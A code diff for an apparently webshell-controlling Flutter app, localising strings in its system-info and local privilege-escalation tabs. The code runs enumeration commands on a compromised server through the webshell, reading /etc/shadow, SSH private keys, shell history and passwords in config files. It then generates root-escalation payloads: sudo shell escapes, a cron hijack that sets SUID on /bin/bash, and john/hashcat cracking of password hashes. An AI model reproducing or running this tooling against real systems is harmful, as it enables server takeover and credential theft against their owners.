@@ -3,6 +3,7 @@ import 'package:flutter/services.dart';
 
 import '../services/webshell_service.dart';
 import '../theme/app_theme.dart';
+import '../app/localization.dart';
 
 // ─── 系统信息 Tab ─────────────────────────────────────────────────────────────
 
@@ -63,7 +64,7 @@ class _SystemInfoTabState extends State<SystemInfoTab>
               ),
               const SizedBox(width: 8),
               Text(
-                '服务器基本信息',
+                S.serverInfo,
                 style: AppTextStyles.heading(
                   size: 14,
                   color: AppColors.primary,
@@ -73,7 +74,7 @@ class _SystemInfoTabState extends State<SystemInfoTab>
               TextButton.icon(
                 onPressed: _loading ? null : _load,
                 icon: const Icon(Icons.refresh, size: 15),
-                label: const Text('刷新'),
+                label: Text(S.actionRefresh),
                 style: TextButton.styleFrom(
                   foregroundColor: AppColors.textSecondary,
                 ),
@@ -98,14 +99,14 @@ class _SystemInfoTabState extends State<SystemInfoTab>
                       ),
                       const SizedBox(height: 16),
                       Text(
-                        '无法获取系统信息',
+                        S.sysInfoFailed,
                         style: AppTextStyles.body(
                           color: AppColors.textSecondary,
                         ),
                       ),
                       const SizedBox(height: 8),
                       Text(
-                        '请检查 Webshell 是否可正常执行远程代码/命令',
+                        S.sysInfoFailedHint,
                         style: AppTextStyles.caption(
                           color: AppColors.textMuted,
                         ),
@@ -114,7 +115,7 @@ class _SystemInfoTabState extends State<SystemInfoTab>
                       FilledButton.icon(
                         onPressed: _load,
                         icon: const Icon(Icons.refresh, size: 16),
-                        label: const Text('重试'),
+                        label: Text(S.btnRetry),
                         style: FilledButton.styleFrom(
                           backgroundColor: AppColors.primary,
                           foregroundColor: AppColors.bgDark,
@@ -245,7 +246,7 @@ class _DisabledFunctionsCard extends StatelessWidget {
               const Icon(Icons.block, color: AppColors.red, size: 16),
               const SizedBox(width: 8),
               Text(
-                '禁用函数 (${funcs.length})',
+                S.disabledFunctions(funcs.length),
                 style: AppTextStyles.body(size: 13, color: AppColors.red),
               ),
             ],
@@ -318,7 +319,7 @@ class _ExtensionsCard extends StatelessWidget {
               ),
               const SizedBox(width: 8),
               Text(
-                '已加载扩展 (${exts.length})',
+                S.loadedExtensions(exts.length),
                 style: AppTextStyles.body(size: 13, color: AppColors.primary),
               ),
             ],
@@ -364,6 +365,7 @@ class _PrivEscSuggestion {
   final String title;
   final String reason;
   final List<String> commands;
+
   /// true = 条件已自动验证，执行建议命令可 100% 提权
   final bool verified;
   const _PrivEscSuggestion({
@@ -375,10 +377,12 @@ class _PrivEscSuggestion {
 }
 
 class _PrivEscItem {
+  final String id;
   final String name;
   final String command;
   final String description;
   const _PrivEscItem({
+    required this.id,
     required this.name,
     required this.command,
     required this.description,
@@ -386,11 +390,13 @@ class _PrivEscItem {
 }
 
 class _PrivEscGroup {
+  final String id;
   final String title;
   final IconData icon;
   final Color color;
   final List<_PrivEscItem> items;
   const _PrivEscGroup({
+    required this.id,
     required this.title,
     required this.icon,
     required this.color,
@@ -412,136 +418,159 @@ class _PrivEscTabState extends State<PrivEscTab>
   final Map<String, bool> _running = {};
   bool _runningAll = false;
 
-  static const _groups = [
+  static List<_PrivEscGroup> get _groups => [
     _PrivEscGroup(
-      title: '当前权限',
+      id: 'current_priv',
+      title: S.privEscGroupCurrentPriv,
       icon: Icons.person_outline,
       color: AppColors.primary,
       items: [
         _PrivEscItem(
-          name: '用户 & 组',
+          id: 'user_group',
+          name: S.privEscItemUserGroup,
           command: 'id && whoami',
-          description: '当前用户 UID/GID 及所属组',
+          description: S.privEscItemUserGroupDesc,
         ),
         _PrivEscItem(
-          name: 'Sudo 权限',
+          id: 'sudo',
+          name: S.privEscItemSudo,
           command: 'sudo -l 2>&1',
-          description: '可 sudo 免密执行的命令',
+          description: S.privEscItemSudoDesc,
         ),
         _PrivEscItem(
-          name: '环境变量',
+          id: 'env',
+          name: S.privEscItemEnv,
           command: 'env 2>/dev/null',
-          description: '环境变量中可能含凭证',
+          description: S.privEscItemEnvDesc,
         ),
       ],
     ),
     _PrivEscGroup(
-      title: '系统信息',
+      id: 'sys_info',
+      title: S.privEscGroupSysInfo,
       icon: Icons.computer_outlined,
       color: AppColors.cyan,
       items: [
         _PrivEscItem(
-          name: '内核版本',
+          id: 'kernel',
+          name: S.privEscItemKernel,
           command: 'uname -a',
-          description: '检查内核版本以匹配本地提权 EXP',
+          description: S.privEscItemKernelDesc,
         ),
         _PrivEscItem(
-          name: '发行版',
+          id: 'distro',
+          name: S.privEscItemDistro,
           command:
               'cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null',
-          description: 'Linux 发行版及版本号',
+          description: S.privEscItemDistroDesc,
         ),
         _PrivEscItem(
-          name: '登录用户',
+          id: 'logged_users',
+          name: S.privEscItemLoggedUsers,
           command: 'w 2>/dev/null || who 2>/dev/null',
-          description: '当前在线会话',
+          description: S.privEscItemLoggedUsersDesc,
         ),
         _PrivEscItem(
-          name: '以 root 运行的进程',
+          id: 'root_procs',
+          name: S.privEscItemRootProcs,
           command: 'ps aux 2>/dev/null | grep "^root" | head -20',
-          description: '以 root 身份运行的服务进程',
+          description: S.privEscItemRootProcsDesc,
         ),
       ],
     ),
     _PrivEscGroup(
-      title: '提权向量',
+      id: 'esc_vectors',
+      title: S.privEscGroupEscVectors,
       icon: Icons.security_outlined,
-      color: Color(0xFFFF9800),
+      color: const Color(0xFFFF9800),
       items: [
         _PrivEscItem(
-          name: 'SUID 文件',
+          id: 'suid',
+          name: S.privEscItemSuid,
           command: r'find / -perm -4000 -type f 2>/dev/null | head -30',
-          description: '具有 SUID 位的可执行文件（可用于提权）',
+          description: S.privEscItemSuidDesc,
         ),
         _PrivEscItem(
-          name: 'SGID 文件',
+          id: 'sgid',
+          name: S.privEscItemSgid,
           command: r'find / -perm -2000 -type f 2>/dev/null | head -20',
-          description: '具有 SGID 位的可执行文件',
+          description: S.privEscItemSgidDesc,
         ),
         _PrivEscItem(
-          name: 'Capabilities',
+          id: 'capabilities',
+          name: S.privEscItemCap,
           command: 'getcap -r / 2>/dev/null',
-          description: '具有 Linux Capabilities 的文件',
+          description: S.privEscItemCapDesc,
         ),
         _PrivEscItem(
-          name: 'Cron 任务',
+          id: 'cron',
+          name: S.privEscItemCron,
           command:
               'crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null',
-          description: '定时任务配置及脚本',
+          description: S.privEscItemCronDesc,
         ),
         _PrivEscItem(
-          name: 'Cron 可写脚本',
+          id: 'cron_writable',
+          name: S.privEscItemCronWritable,
           command:
               r'find /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly /var/spool/cron \( -type f -o -type l \) 2>/dev/null -exec sh -c "m=$(stat -c \"%a\" \"$1\" 2>/dev/null);u=$(stat -c \"%u\" \"$1\" 2>/dev/null);g=$(stat -c \"%g\" \"$1\" 2>/dev/null);myu=$(id -u);o=$((m/100));gr=$((m/10%10));t=$((m%10));[ $((t&2)) -ne 0 ] && echo \"$1\";[ \"$u\" = \"$myu\" ] && [ $((o&2)) -ne 0 ] && echo \"$1\";id -G | tr \" \" \"\n\" | grep -q \"^${g}$\" && [ $((gr&2)) -ne 0 ] && echo \"$1\"" _ {} \;',
-          description: '根据权限位+当前用户/组判断可写（无写入、无副作用）',
+          description: S.privEscItemCronWritableDesc,
         ),
         _PrivEscItem(
-          name: '可写目录',
+          id: 'writable_dirs',
+          name: S.privEscItemWritableDirs,
           command:
               r"find / -writable -type d 2>/dev/null | grep -Ev '/proc|/sys|/dev|/run' | head -20",
-          description: '当前用户可写的目录',
+          description: S.privEscItemWritableDirsDesc,
         ),
         _PrivEscItem(
-          name: 'PATH 劫持',
+          id: 'path_hijack',
+          name: S.privEscItemPathHijack,
           command:
               r'echo $PATH && find $(echo $PATH | tr ":" " ") -writable 2>/dev/null',
-          description: '检查 PATH 中是否有可写目录',
+          description: S.privEscItemPathHijackDesc,
         ),
       ],
     ),
     _PrivEscGroup(
-      title: '敏感信息',
+      id: 'sensitive_info',
+      title: S.privEscGroupSensitiveInfo,
       icon: Icons.key_outlined,
       color: AppColors.red,
       items: [
         _PrivEscItem(
-          name: '可登录账户',
+          id: 'loginable_accounts',
+          name: S.privEscItemLoginableAccounts,
           command:
               r"cat /etc/passwd | grep -Ev 'nologin|false|sync|halt|shutdown'",
-          description: '可正常登录的用户账户',
+          description: S.privEscItemLoginableAccountsDesc,
         ),
         _PrivEscItem(
-          name: 'Shadow 文件',
+          id: 'shadow',
+          name: S.privEscItemShadow,
           command: 'cat /etc/shadow 2>/dev/null',
-          description: '尝试读取密码哈希（需 root）',
+          description: S.privEscItemShadowDesc,
         ),
         _PrivEscItem(
-          name: '历史命令',
+          id: 'history',
+          name: S.privEscItemHistory,
           command:
               'cat ~/.bash_history 2>/dev/null || cat ~/.zsh_history 2>/dev/null | head -40',
-          description: '历史命令中可能含明文凭证',
+          description: S.privEscItemHistoryDesc,
         ),
         _PrivEscItem(
-          name: 'SSH 密钥',
+          id: 'ssh_keys',
+          name: S.privEscItemSshKeys,
           command:
               'ls -la ~/.ssh/ 2>/dev/null && cat ~/.ssh/id_rsa 2>/dev/null | head -5',
-          description: '私钥文件是否可读',
+          description: S.privEscItemSshKeysDesc,
         ),
         _PrivEscItem(
-          name: '配置文件密码',
+          id: 'config_passwords',
+          name: S.privEscItemConfigPasswords,
           command:
               r"grep -rls 'password\|passwd\|pass=' /var/www /etc 2>/dev/null | head -10 | xargs grep -h 'password\|passwd' 2>/dev/null | grep -v '^#' | head -20",
-          description: 'Web/系统配置文件中的明文密码',
+          description: S.privEscItemConfigPasswordsDesc,
         ),
       ],
     ),
@@ -550,20 +579,20 @@ class _PrivEscTabState extends State<PrivEscTab>
   String _key(String group, String item) => '$group/$item';
 
   Future<void> _runCheck(_PrivEscGroup group, _PrivEscItem item) async {
-    final key = _key(group.title, item.name);
+    final key = _key(group.id, item.id);
     setState(() => _running[key] = true);
     try {
       final out = await widget.service.executeCommand(item.command);
       if (mounted) {
         setState(() {
-          _results[key] = out.trim().isEmpty ? '(无输出)' : out.trim();
+          _results[key] = out.trim().isEmpty ? S.noOutput : out.trim();
           _running[key] = false;
         });
       }
     } catch (e) {
       if (mounted) {
         setState(() {
-          _results[key] = '[错误] $e';
+          _results[key] = S.errorResult(e);
           _running[key] = false;
         });
       }
@@ -581,33 +610,34 @@ class _PrivEscTabState extends State<PrivEscTab>
   }
 
   void _clearAll() => setState(() {
-        _results.clear();
-        _running.clear();
-      });
+    _results.clear();
+    _running.clear();
+  });
 
   /// 根据检查结果分析并生成提权建议（解析实际路径/命令，提高准确性）
   List<_PrivEscSuggestion> _analyzeResults() {
     final suggestions = <_PrivEscSuggestion>[];
-    String res(String g, String i) =>
-        _results[_key(g, i)] ?? '';
+    String res(String g, String i) => _results[_key(g, i)] ?? '';
 
     // 1. Sudo 提权
-    final sudo = res('当前权限', 'Sudo 权限');
+    final sudo = res('current_priv', 'sudo');
     if (sudo.isNotEmpty &&
         !sudo.contains('Permission denied') &&
         sudo.contains('NOPASSWD')) {
       if (sudo.contains('(ALL)') || sudo.contains('ALL')) {
-        suggestions.add(_PrivEscSuggestion(
-          title: 'Sudo 免密提权',
-          reason: '检测到 sudo 可免密执行 ALL，直接提权：',
-          commands: ['sudo su', 'sudo -i', 'sudo bash'],
-        ));
+        suggestions.add(
+          _PrivEscSuggestion(
+            title: S.privEscSudoAllTitle,
+            reason: S.privEscSudoAllReason,
+            commands: ['sudo su', 'sudo -i', 'sudo bash'],
+          ),
+        );
       } else {
         // 解析 sudo -l 输出中的具体命令路径
         final cmdMatches = RegExp(
-                r'NOPASSWD:\s*([^\s,]+)',
-                multiLine: true)
-            .allMatches(sudo);
+          r'NOPASSWD:\s*([^\s,]+)',
+          multiLine: true,
+        ).allMatches(sudo);
         final paths = cmdMatches
             .map((m) => m.group(1)?.trim())
             .whereType<String>()
@@ -627,30 +657,36 @@ class _PrivEscTabState extends State<PrivEscTab>
             cmds.add('sudo $p -e \'exec "/bin/sh";\'');
           } else if (base.contains('nmap')) {
             cmds.add('sudo $p --interactive');
-            cmds.add('# 进入后输入: !sh');
+            cmds.add('# !sh');
           } else if (base.contains('awk')) {
             cmds.add('sudo $p \'BEGIN {system("/bin/sh -p")}\'');
           } else if (base.contains('less') || base.contains('more')) {
             cmds.add('sudo $p /etc/shadow');
-            cmds.add('# 进入后输入: !/bin/sh');
+            cmds.add('# !/bin/sh');
           } else {
-            cmds.add('# $p → 在 https://gtfobins.github.io 搜索');
+            cmds.add('# $p → https://gtfobins.github.io');
           }
         }
         if (cmds.isEmpty) {
-          cmds.add('# 在 https://gtfobins.github.io 搜索上述命令');
+          cmds.add('# https://gtfobins.github.io');
         }
-        suggestions.add(_PrivEscSuggestion(
-          title: 'Sudo 受限命令提权',
-          reason: '检测到免密 sudo：${paths.take(3).join(", ")}${paths.length > 3 ? "…" : ""}',
-          commands: cmds,
-        ));
+        suggestions.add(
+          _PrivEscSuggestion(
+            title: S.privEscSudoLimitedTitle,
+            reason: S.privEscSudoLimitedReason(
+              '${paths.take(3).join(", ")}${paths.length > 3 ? "…" : ""}',
+            ),
+            commands: cmds,
+          ),
+        );
       }
     }
 
     // 2. SUID 提权（解析实际路径，使用完整路径执行）
-    final suid = res('提权向量', 'SUID 文件');
-    if (suid.isNotEmpty && suid != '(无输出)' && !suid.startsWith('[错误]')) {
+    final suid = res('esc_vectors', 'suid');
+    if (suid.isNotEmpty &&
+        suid != S.noOutput &&
+        !suid.startsWith(S.logErrorTag)) {
       final pathRegex = RegExp(r'(/[^\s]+)');
       final paths = pathRegex
           .allMatches(suid)
@@ -689,7 +725,7 @@ class _PrivEscTabState extends State<PrivEscTab>
           final base = path.split('/').last.toLowerCase();
           if (base.contains('nmap')) {
             cmds.add('$path --interactive');
-            cmds.add('# 进入后输入: !sh');
+            cmds.add('# !sh');
             break;
           }
         }
@@ -713,64 +749,70 @@ class _PrivEscTabState extends State<PrivEscTab>
         }
       }
       if (cmds.isNotEmpty) {
-        suggestions.add(_PrivEscSuggestion(
-          title: 'SUID 提权',
-          reason: '发现可滥用 SUID 文件，在终端执行（需在可写目录）：',
-          commands: cmds,
-        ));
+        suggestions.add(
+          _PrivEscSuggestion(
+            title: S.privEscSuidTitle,
+            reason: S.privEscSuidReason,
+            commands: cmds,
+          ),
+        );
       }
     }
 
     // 3. 内核 EXP（需本地查找 exploit，非 100%）
-    final uname = res('系统信息', '内核版本');
+    final uname = res('sys_info', 'kernel');
     if (uname.isNotEmpty &&
-        uname != '(无输出)' &&
-        !uname.startsWith('[错误]')) {
+        uname != S.noOutput &&
+        !uname.startsWith(S.logErrorTag)) {
       final verMatch = RegExp(r'(\d+\.\d+\.\d+)').firstMatch(uname);
       final archMatch = RegExp(r'(x86_64|i686|aarch64|arm)').firstMatch(uname);
       if (verMatch != null) {
         final arch = archMatch?.group(1) ?? 'x86_64';
-        suggestions.add(_PrivEscSuggestion(
-          title: '内核提权（需本地查找 exploit）',
-          reason: '内核 ${verMatch.group(1)} ($arch)，需在本地搜索对应 CVE',
-          commands: [
-            'searchsploit Linux Kernel ${verMatch.group(1)}',
-            '# https://www.exploit-db.com/search?q=${Uri.encodeComponent('Linux Kernel ${verMatch.group(1)}')}',
-          ],
-          verified: false,
-        ));
+        suggestions.add(
+          _PrivEscSuggestion(
+            title: S.privEscKernelTitle,
+            reason: S.privEscKernelReason(verMatch.group(1)!, arch),
+            commands: [
+              'searchsploit Linux Kernel ${verMatch.group(1)}',
+              '# https://www.exploit-db.com/search?q=${Uri.encodeComponent('Linux Kernel ${verMatch.group(1)}')}',
+            ],
+            verified: false,
+          ),
+        );
       }
     }
 
     // 4. Shadow 破解（需本地破解，成功率取决于密码强度）
-    final shadow = res('敏感信息', 'Shadow 文件');
+    final shadow = res('sensitive_info', 'shadow');
     if (shadow.isNotEmpty &&
-        shadow != '(无输出)' &&
-        !shadow.startsWith('[错误]') &&
+        shadow != S.noOutput &&
+        !shadow.startsWith(S.logErrorTag) &&
         !shadow.contains('Permission denied') &&
         RegExp(r'root:\$[156]\$').hasMatch(shadow)) {
       final hashMode = shadow.contains(r'$6$')
           ? ('1800', 'sha512crypt')
           : shadow.contains(r'$5$')
-              ? ('7400', 'sha256crypt')
-              : ('500', 'md5crypt');
-      suggestions.add(_PrivEscSuggestion(
-        title: '密码哈希破解（需本地破解）',
-        reason: '已获取 shadow，本地破解（${hashMode.$2}），成功率取决于密码强度',
-        commands: [
-          'unshadow /etc/passwd /etc/shadow > hashes.txt',
-          'john hashes.txt',
-          '# hashcat: hashcat -m ${hashMode.$1} hashes.txt wordlist.txt',
-        ],
-        verified: false,
-      ));
+          ? ('7400', 'sha256crypt')
+          : ('500', 'md5crypt');
+      suggestions.add(
+        _PrivEscSuggestion(
+          title: S.privEscShadowTitle,
+          reason: S.privEscShadowReason(hashMode.$2),
+          commands: [
+            'unshadow /etc/passwd /etc/shadow > hashes.txt',
+            'john hashes.txt',
+            '# hashcat: hashcat -m ${hashMode.$1} hashes.txt wordlist.txt',
+          ],
+          verified: false,
+        ),
+      );
     }
 
     // 5. Cron 脚本劫持（仅当检测到可写文件时建议，100% 可提权）
-    final cronWritable = res('提权向量', 'Cron 可写脚本');
+    final cronWritable = res('esc_vectors', 'cron_writable');
     if (cronWritable.isNotEmpty &&
-        cronWritable != '(无输出)' &&
-        !cronWritable.startsWith('[错误]')) {
+        cronWritable != S.noOutput &&
+        !cronWritable.startsWith(S.logErrorTag)) {
       final writablePaths = cronWritable
           .split('\n')
           .map((s) => s.trim())
@@ -780,27 +822,31 @@ class _PrivEscTabState extends State<PrivEscTab>
           .toList();
       if (writablePaths.isNotEmpty) {
         final cmds = <String>[
-          '# 先在 /tmp 创建 payload，再 cp 覆盖目标（避免 echo>> 在某些环境失效）',
+          '# Create SUID payload, then overwrite writable cron files:',
           r"printf '#!/bin/bash\nchmod u+s /bin/bash\n' > /tmp/_mx",
           ...writablePaths.map((p) => 'cp /tmp/_mx $p'),
-          '# 等待 cron 执行（通常 1 分钟内）后：',
+          '# Wait for cron to run (usually within 1 min), then:',
           '/bin/bash -p',
         ];
-        suggestions.add(_PrivEscSuggestion(
-          title: 'Cron 劫持（已验证可写）',
-          reason: '已自动检测到可写 cron 文件：${writablePaths.take(2).join(", ")}${writablePaths.length > 2 ? "…" : ""}',
-          commands: cmds,
-        ));
+        suggestions.add(
+          _PrivEscSuggestion(
+            title: S.privEscCronTitle,
+            reason: S.privEscCronReason(
+              '${writablePaths.take(2).join(", ")}${writablePaths.length > 2 ? "…" : ""}',
+            ),
+            commands: cmds,
+          ),
+        );
       }
     }
 
     // 5b. PATH 劫持（需等待命令被调用，非 100% 不加入主建议）
 
     // 6. Capabilities 提权（解析实际二进制路径）
-    final cap = res('提权向量', 'Capabilities');
+    final cap = res('esc_vectors', 'capabilities');
     if (cap.isNotEmpty &&
-        cap != '(无输出)' &&
-        !cap.startsWith('[错误]') &&
+        cap != S.noOutput &&
+        !cap.startsWith(S.logErrorTag) &&
         cap.contains('cap_setuid')) {
       final paths = RegExp(r'(\S+)\s*=\s*.*cap_setuid')
           .allMatches(cap)
@@ -814,17 +860,19 @@ class _PrivEscTabState extends State<PrivEscTab>
       if (paths.isNotEmpty) {
         for (final p in paths) {
           cmds.add('$p -p');
-          cmds.add('# 或尝试: $p --help 查看可用的提权参数');
+          cmds.add('# Or: $p --help');
         }
       } else {
         cmds.add('getcap -r / 2>/dev/null');
-        cmds.add('# 找到 cap_setuid 的路径后执行: /path/to/binary -p');
+        cmds.add('# find cap_setuid binary then: /path/to/binary -p');
       }
-      suggestions.add(_PrivEscSuggestion(
-        title: 'Capabilities 提权',
-        reason: '发现 cap_setuid，直接执行上述路径：',
-        commands: cmds,
-      ));
+      suggestions.add(
+        _PrivEscSuggestion(
+          title: S.privEscCapTitle,
+          reason: S.privEscCapReason,
+          commands: cmds,
+        ),
+      );
     }
 
     return suggestions;
@@ -849,21 +897,26 @@ class _PrivEscTabState extends State<PrivEscTab>
               const Icon(Icons.shield_outlined, color: AppColors.red, size: 16),
               const SizedBox(width: 8),
               Text(
-                '本地提权检查',
+                S.privEscTitle,
                 style: AppTextStyles.heading(size: 14, color: AppColors.red),
               ),
               if (doneCount > 0) ...[
                 const SizedBox(width: 8),
                 Container(
-                  padding:
-                      const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
+                  padding: const EdgeInsets.symmetric(
+                    horizontal: 6,
+                    vertical: 2,
+                  ),
                   decoration: BoxDecoration(
                     color: AppColors.red.withValues(alpha: 0.15),
                     borderRadius: BorderRadius.circular(4),
                   ),
                   child: Text(
                     '$doneCount/$totalCount',
-                    style: AppTextStyles.caption(size: 11, color: AppColors.red),
+                    style: AppTextStyles.caption(
+                      size: 11,
+                      color: AppColors.red,
+                    ),
                   ),
                 ),
               ],
@@ -872,7 +925,7 @@ class _PrivEscTabState extends State<PrivEscTab>
                 TextButton.icon(
                   onPressed: _runningAll ? null : _clearAll,
                   icon: const Icon(Icons.delete_sweep_outlined, size: 14),
-                  label: const Text('清空'),
+                  label: Text(S.btnClear),
                   style: TextButton.styleFrom(
                     foregroundColor: AppColors.textSecondary,
                     padding: const EdgeInsets.symmetric(horizontal: 8),
@@ -886,15 +939,19 @@ class _PrivEscTabState extends State<PrivEscTab>
                         width: 12,
                         height: 12,
                         child: CircularProgressIndicator(
-                            strokeWidth: 1.5, color: Colors.white),
+                          strokeWidth: 1.5,
+                          color: Colors.white,
+                        ),
                       )
                     : const Icon(Icons.play_arrow_rounded, size: 15),
-                label: Text(_runningAll ? '检查中…' : '一键检查'),
+                label: Text(_runningAll ? S.checkingAll : S.btnCheckAll),
                 style: FilledButton.styleFrom(
                   backgroundColor: AppColors.red,
                   foregroundColor: Colors.white,
-                  padding:
-                      const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
+                  padding: const EdgeInsets.symmetric(
+                    horizontal: 12,
+                    vertical: 6,
+                  ),
                   textStyle: AppTextStyles.body(size: 13),
                 ),
               ),
@@ -905,25 +962,29 @@ class _PrivEscTabState extends State<PrivEscTab>
           child: Builder(
             builder: (context) {
               final suggestions = _analyzeResults()
-                ..sort((a, b) => (b.verified ? 1 : 0).compareTo(a.verified ? 1 : 0));
+                ..sort(
+                  (a, b) => (b.verified ? 1 : 0).compareTo(a.verified ? 1 : 0),
+                );
               return ListView(
-                padding:
-                    const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
+                padding: const EdgeInsets.symmetric(
+                  horizontal: 16,
+                  vertical: 12,
+                ),
                 children: [
                   if (suggestions.isNotEmpty)
                     _PrivEscSuggestionsCard(
                       suggestions: suggestions,
                       onCopy: (cmd) {
-                    Clipboard.setData(ClipboardData(text: cmd));
-                    ScaffoldMessenger.of(context).showSnackBar(
-                      const SnackBar(
-                        content: Text('已复制到剪贴板'),
-                        duration: Duration(seconds: 1),
-                        behavior: SnackBarBehavior.floating,
-                      ),
-                    );
-                  },
-                ),
+                        Clipboard.setData(ClipboardData(text: cmd));
+                        ScaffoldMessenger.of(context).showSnackBar(
+                          SnackBar(
+                            content: Text(S.snackCopied),
+                            duration: const Duration(seconds: 1),
+                            behavior: SnackBarBehavior.floating,
+                          ),
+                        );
+                      },
+                    ),
                   ..._groups.map(
                     (group) => _PrivEscGroupWidget(
                       group: group,
@@ -960,124 +1021,134 @@ class _PrivEscSuggestionsCard extends StatelessWidget {
       decoration: BoxDecoration(
         color: AppColors.primary.withValues(alpha: 0.06),
         borderRadius: BorderRadius.circular(10),
-        border: Border.all(
-          color: AppColors.primary.withValues(alpha: 0.35),
-        ),
+        border: Border.all(color: AppColors.primary.withValues(alpha: 0.35)),
       ),
       child: Column(
         crossAxisAlignment: CrossAxisAlignment.start,
         children: [
           Row(
             children: [
-              Icon(Icons.lightbulb_outline,
-                  size: 18, color: AppColors.primary),
+              Icon(Icons.lightbulb_outline, size: 18, color: AppColors.primary),
               const SizedBox(width: 8),
               Text(
-                '提权建议（根据检查结果）',
+                S.privEscSuggestions,
                 style: AppTextStyles.heading(
-                    size: 14, color: AppColors.primary),
+                  size: 14,
+                  color: AppColors.primary,
+                ),
               ),
             ],
           ),
           const SizedBox(height: 12),
-          ...suggestions.map((s) => Padding(
-                padding: const EdgeInsets.only(bottom: 12),
-                child: Column(
-                  crossAxisAlignment: CrossAxisAlignment.start,
-                  children: [
-                    Row(
-                      children: [
-                        Expanded(
+          ...suggestions.map(
+            (s) => Padding(
+              padding: const EdgeInsets.only(bottom: 12),
+              child: Column(
+                crossAxisAlignment: CrossAxisAlignment.start,
+                children: [
+                  Row(
+                    children: [
+                      Expanded(
+                        child: Text(
+                          s.title,
+                          style: AppTextStyles.body(
+                            size: 13,
+                            color: AppColors.textPrimary,
+                          ).copyWith(fontWeight: FontWeight.w600),
+                        ),
+                      ),
+                      if (s.verified)
+                        Container(
+                          padding: const EdgeInsets.symmetric(
+                            horizontal: 6,
+                            vertical: 2,
+                          ),
+                          decoration: BoxDecoration(
+                            color: AppColors.primary.withValues(alpha: 0.2),
+                            borderRadius: BorderRadius.circular(4),
+                          ),
                           child: Text(
-                            s.title,
-                            style: AppTextStyles.body(
-                                    size: 13, color: AppColors.textPrimary)
-                                .copyWith(fontWeight: FontWeight.w600),
+                            '100%',
+                            style: AppTextStyles.caption(
+                              size: 10,
+                              color: AppColors.primary,
+                            ),
                           ),
                         ),
-                        if (s.verified)
-                          Container(
-                            padding: const EdgeInsets.symmetric(
-                                horizontal: 6, vertical: 2),
-                            decoration: BoxDecoration(
-                              color: AppColors.primary.withValues(alpha: 0.2),
-                              borderRadius: BorderRadius.circular(4),
-                            ),
-                            child: Text(
-                              '100%',
-                              style: AppTextStyles.caption(
-                                  size: 10, color: AppColors.primary),
-                            ),
-                          ),
-                      ],
+                    ],
+                  ),
+                  const SizedBox(height: 2),
+                  Text(
+                    s.reason,
+                    style: AppTextStyles.caption(
+                      size: 11,
+                      color: AppColors.textMuted,
                     ),
-                    const SizedBox(height: 2),
-                    Text(
-                      s.reason,
-                      style: AppTextStyles.caption(
-                          size: 11, color: AppColors.textMuted),
-                    ),
-                    const SizedBox(height: 6),
-                    ...s.commands.map((cmd) {
-                      final isComment = cmd.startsWith('#');
-                      return Padding(
-                        padding: const EdgeInsets.only(bottom: 4),
-                        child: Row(
-                          crossAxisAlignment: CrossAxisAlignment.start,
-                          children: [
-                            Expanded(
-                              child: Container(
-                                padding: const EdgeInsets.symmetric(
-                                    horizontal: 8, vertical: 6),
-                                decoration: BoxDecoration(
+                  ),
+                  const SizedBox(height: 6),
+                  ...s.commands.map((cmd) {
+                    final isComment = cmd.startsWith('#');
+                    return Padding(
+                      padding: const EdgeInsets.only(bottom: 4),
+                      child: Row(
+                        crossAxisAlignment: CrossAxisAlignment.start,
+                        children: [
+                          Expanded(
+                            child: Container(
+                              padding: const EdgeInsets.symmetric(
+                                horizontal: 8,
+                                vertical: 6,
+                              ),
+                              decoration: BoxDecoration(
+                                color: isComment
+                                    ? AppColors.bgDark
+                                    : AppColors.bgCard,
+                                borderRadius: BorderRadius.circular(4),
+                                border: Border.all(
                                   color: isComment
-                                      ? AppColors.bgDark
-                                      : AppColors.bgCard,
-                                  borderRadius: BorderRadius.circular(4),
-                                  border: Border.all(
-                                    color: isComment
-                                        ? AppColors.border
-                                        : AppColors.primary
-                                            .withValues(alpha: 0.3),
-                                  ),
+                                      ? AppColors.border
+                                      : AppColors.primary.withValues(
+                                          alpha: 0.3,
+                                        ),
                                 ),
-                                child: SelectableText(
-                                  cmd,
-                                  style: TextStyle(
-                                    fontFamily: 'Monaco',
-                                    fontFamilyFallback: const [
-                                      'Courier New',
-                                      'monospace'
-                                    ],
-                                    fontSize: 11,
-                                    color: isComment
-                                        ? AppColors.textMuted
-                                        : AppColors.cyan,
-                                  ),
+                              ),
+                              child: SelectableText(
+                                cmd,
+                                style: TextStyle(
+                                  fontFamily: 'Monaco',
+                                  fontFamilyFallback: const [
+                                    'Courier New',
+                                    'monospace',
+                                  ],
+                                  fontSize: 11,
+                                  color: isComment
+                                      ? AppColors.textMuted
+                                      : AppColors.cyan,
                                 ),
                               ),
                             ),
-                            if (!isComment) ...[
-                              const SizedBox(width: 6),
-                              IconButton(
-                                onPressed: () => onCopy(cmd),
-                                icon: const Icon(Icons.copy_outlined,
-                                    size: 16),
-                                style: IconButton.styleFrom(
-                                  foregroundColor: AppColors.textSecondary,
-                                  padding: const EdgeInsets.all(4),
-                                  minimumSize: const Size(28, 28),
-                                ),
-                                tooltip: '复制',
+                          ),
+                          if (!isComment) ...[
+                            const SizedBox(width: 6),
+                            IconButton(
+                              onPressed: () => onCopy(cmd),
+                              icon: const Icon(Icons.copy_outlined, size: 16),
+                              style: IconButton.styleFrom(
+                                foregroundColor: AppColors.textSecondary,
+                                padding: const EdgeInsets.all(4),
+                                minimumSize: const Size(28, 28),
                               ),
-                            ],
+                              tooltip: S.actionCopy,
+                            ),
                           ],
-                        ),
-                      );
-                    }),
-                  ],
-                ),
-              )),
+                        ],
+                      ),
+                    );
+                  }),
+                ],
+              ),
+            ),
+          ),
         ],
       ),
     );
@@ -1114,8 +1185,7 @@ class _PrivEscGroupWidget extends StatelessWidget {
                 const SizedBox(width: 6),
                 Text(
                   group.title,
-                  style:
-                      AppTextStyles.heading(size: 13, color: group.color),
+                  style: AppTextStyles.heading(size: 13, color: group.color),
                 ),
                 const SizedBox(width: 8),
                 Expanded(
@@ -1128,7 +1198,7 @@ class _PrivEscGroupWidget extends StatelessWidget {
             ),
           ),
           ...group.items.map((item) {
-            final key = keyOf(group.title, item.name);
+            final key = keyOf(group.id, item.id);
             return _PrivEscItemWidget(
               item: item,
               color: group.color,
@@ -1161,8 +1231,8 @@ class _PrivEscItemWidget extends StatelessWidget {
